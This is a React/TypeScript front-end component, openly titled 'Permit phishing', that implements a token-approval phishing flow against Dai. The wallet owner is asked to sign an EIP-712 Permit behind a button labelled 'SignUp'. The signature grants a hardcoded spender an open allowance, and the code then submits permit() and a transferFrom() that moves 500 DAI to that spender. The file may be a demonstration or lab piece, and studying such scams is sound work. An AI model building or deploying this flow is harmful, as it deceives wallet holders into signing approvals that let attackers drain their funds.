import { useAccount, useSignTypedData } from "wagmi";
import { Address, TypedDataDomain } from "viem";
import { address as contractAddrss } from "./constant";
import styles from "./index.module.less";
import {
  Button,
  FormControl,
  FormLabel,
  Input,
  useToast,
} from "@chakra-ui/react";
import { useMint } from "./hooks/mint";
import { useAllowance } from "./hooks/allowance";
import { usePermit } from "./hooks/permit";
import { useTransferFrom } from "./hooks/transferFrom";
import classNames from "classnames";
import { useEffect, useRef, useState } from "react";
interface IValue {
  holder: Address;
  spender: Address;
  nonce: number;
  expiry: number;
  allowed: boolean;
}
const Permit = () => {
  const { mint } = useMint();
  const { permit } = usePermit();
  const [formatAllowance, setFormatAllowance] = useState(0);
  const allowance = useAllowance({
    args: [
      "0xAc1a73cf5F3FD0FDF9E719dC13d74F7c612Bd8aB",
      "0xaD91671a4f64cF7820A0A919B76Bc2818135a97c",
    ],
  });
  console.log(allowance, "fsdfsdfsd");
  const toast = useToast();
  const { transferFrom } = useTransferFrom();
  const { chainId, address } = useAccount();
  const { signTypedData } = useSignTypedData();
  const rRef = useRef<string>();
  const sRef = useRef<string>();
  const vRef = useRef<number>();
  const domain: TypedDataDomain = {
    name: "Dai Stablecoin",
    version: "1",
    chainId,
    verifyingContract: contractAddrss,
  };
  const types = {
    Permit: [
      { name: "holder", type: "address" },
      { name: "spender", type: "address" },
      { name: "nonce", type: "uint256" },
      { name: "expiry", type: "uint256" },
      { name: "allowed", type: "bool" },
    ],
  };
  useEffect(() => {
    if (allowance) {
      setFormatAllowance(parseInt((allowance as number).toString()) / 10 ** 18);
    }
  }, [allowance]);
  const message = {
    holder: address,
    spender: "0xaD91671a4f64cF7820A0A919B76Bc2818135a97c",
    nonce: 0,
    expiry: 2208963661,
    allowed: true,
  };

  const sign = () => {
    const result = signTypedData(
      {
        primaryType: "Permit",
        domain,
        types,
        message,
      },
      {
        onSuccess(data) {
          const signature = data.substring(2);
          const r = "0x" + signature.substring(0, 64);
          const s = "0x" + signature.substring(64, 128);
          const v = parseInt(signature.substring(128, 130), 16);
          rRef.current = r;
          sRef.current = s;
          vRef.current = v;

          toast({
            title: "success",
            description: "签名成功！",
            status: "success",
            duration: 9000,
            isClosable: true,
          });
        },
      }
    );
  };

  const handleTransferFrom = () => {
    transferFrom({
      args: [
        "0xAc1a73cf5F3FD0FDF9E719dC13d74F7c612Bd8aB",
        "0xaD91671a4f64cF7820A0A919B76Bc2818135a97c",
        500 * 10 ** 18,
      ],
    }).catch((error) => {
      console.log(error, "fsfs");
    });
  };

  const handlePermit = () => {
    permit({
      args: [
        "0xAc1a73cf5F3FD0FDF9E719dC13d74F7c612Bd8aB",
        "0xaD91671a4f64cF7820A0A919B76Bc2818135a97c",
        0,
        2208963661,
        true,
        vRef.current,
        rRef.current,
        sRef.current,
      ],
    });
  };
  const [amount, setAmount] = useState<string>(
    "0xaD91671a4f64cF7820A0A919B76Bc2818135a97c"
  );
  const [loading, setLoading] = useState(false);
  const [disabled, setDisabled] = useState(true);
  const [type, setType] = useState("1");
  const [formatBalance, setFormatBalance] = useState(0);
  return (
    <section
      className={classNames(
        styles.permit,
        "flex items-center flex-col justify-center"
      )}
    >
      <span className="text-white font-bold text-5xl mb-8">Permit钓鱼</span>
      <div className={classNames(styles.form, "py-6 px-4 w-11/12 sm:w-2/6 ")}>
        <div className={classNames(styles.tabs, "flex items-center mb-3")}>
          <div
            className={classNames(
              styles.item,
              type === "1" && styles.active,
              "flex-1 flex items-center justify-center"
            )}
            onClick={() => {
              setType("1");
            }}
          >
            <span>Permit</span>
          </div>
          <div
            className={classNames(
              styles.item,
              type === "2" && styles.active,
              "flex-1 flex items-center justify-center"
            )}
            onClick={() => {
              setType("2");
            }}
          >
            <span>TransferFrom</span>
          </div>
        </div>
        <FormControl>
          {type === "1" && (
            <>
              <FormLabel
                className={classNames(
                  styles.label,
                  "w-full items-center justify-between"
                )}
              >
                <span className={classNames("text-white  font-bold")}>
                  Address
                </span>
                <span className={classNames(styles.balance)}>
                  {/* <i className="icon-yue iconfont mr-1" />
            {formatBalance.toFixed(3)} {"ETH"} */}
                  被授权地址
                </span>
              </FormLabel>
              <Input
                className={classNames(styles.input, styles.amount, "mt-2")}
                placeholder={"0.00"}
                value={amount}
                disabled
                onChange={(e) => {
                  setAmount(e.target.value);
                }}
              />
            </>
          )}
          {type === "2" && (
            <>
              <FormLabel
                className={classNames(
                  styles.label,
                  "w-full items-center justify-between"
                )}
              >
                <span className={classNames("text-white  font-bold")}>
                  Amount
                </span>
                <span className={classNames(styles.balance)}>
                  <i className="icon-yue iconfont mr-1" />
                  {formatAllowance.toFixed(3)} {"DAI"}
                </span>
              </FormLabel>
              <Input
                className={classNames(styles.input, styles.amount, "mt-2")}
                placeholder={"0.00"}
                type="number"
                value={amount}
                onChange={(e) => {
                  setAmount(e.target.value);
                }}
              />
            </>
          )}

          <div className="flex">
            {type === "1" && (
              <Button
                width={"100%"}
                borderRadius={"999px"}
                colorScheme="teal"
                height={"60px"}
                className="mt-8 mr-2"
                isLoading={loading}
                disabled={disabled}
                onClick={() => {
                  sign();
                  // mint({
                  //   args: [
                  //     "0xAc1a73cf5F3FD0FDF9E719dC13d74F7c612Bd8aB",
                  //     500 * 10 ** 18,
                  //   ],
                  // });
                }}
              >
                SignUp
              </Button>
            )}
            <Button
              width={"100%"}
              borderRadius={"999px"}
              colorScheme="teal"
              height={"60px"}
              className="mt-8"
              isLoading={loading}
              disabled={disabled}
              onClick={() => {
                type === "1" ? handlePermit() : handleTransferFrom();
              }}
            >
              {type === "1" ? "Permit" : "TransferFrom"}
            </Button>
          </div>
        </FormControl>
      </div>
    </section>
  );
};

export default Permit;
